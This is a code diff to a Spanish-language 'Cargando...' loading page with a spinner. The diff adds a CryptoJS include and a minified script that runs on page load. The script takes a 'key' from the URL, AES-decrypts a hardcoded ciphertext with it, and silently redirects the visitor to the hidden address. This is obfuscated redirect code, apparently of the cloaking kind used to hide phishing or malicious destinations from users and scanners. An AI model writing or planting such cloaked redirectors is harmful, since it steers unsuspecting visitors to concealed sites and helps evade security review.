@@ -1,53 +1,61 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-    body {
-        background-color: #141414;
-        color: #e5e5e5;
-        font-family: Arial, sans-serif;
-        text-align: center;
-        padding: 50px;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
-    .loading {
-        font-size: 24px;
-        margin-bottom: 20px;
-    }
-    .spinner {
-        border: 4px solid rgba(229, 229, 229, 0.3);
-        border-top: 4px solid #e5e5e5;
-        border-radius: 50%;
-        width: 40px;
-        height: 40px;
-        animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-    button {
-        background-color: #141414;
-        color: #e5e5e5;
-        border: 2px solid #e5e5e5;
-        padding: 10px 20px;
-        font-size: 16px;
-        cursor: pointer;
-        border-radius: 5px;
-    }
-    button:hover {
-        background-color: #e5e5e5;
-        color: #141414;
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>loading</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+    <style>
+        body {
+            background-color: #141414;
+            color: #e5e5e5;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .loading {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .spinner {
+            border: 4px solid rgba(229, 229, 229, 0.3);
+            border-top: 4px solid #e5e5e5;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        button {
+            background-color: #141414;
+            color: #e5e5e5;
+            border: 2px solid #e5e5e5;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #e5e5e5;
+            color: #141414;
+        }
+    </style>
 </head>
 <body>
     <div class="loading">Cargando...</div>
     <div class="spinner"></div>
+
+    <script>
+function d(a,b){const c=CryptoJS.enc.Utf8.parse(b.padEnd(16).slice(0,16)),e=CryptoJS.enc.Base64.parse(a),f=CryptoJS.lib.WordArray.create(e.words.slice(0,4)),g=CryptoJS.lib.WordArray.create(e.words.slice(4));return CryptoJS.AES.decrypt({ciphertext:g},c,{iv:f,mode:CryptoJS.mode.CBC,padding:CryptoJS.pad.Pkcs7}).toString(CryptoJS.enc.Utf8)}document.addEventListener('DOMContentLoaded',()=>{try{const i=new URLSearchParams(window.location.search),j=i.get('key'),k="k3UI538f9u9EsPY+afK4Z+qwRmMOQjO2j3AVC+5nQ6fQRrkoHGaMzvTAD05emdwt";if(j&&k){try{window.location.href=d(k,j)}catch(m){}}}catch(n){}})
+
+    </script>
 </body>
 </html>
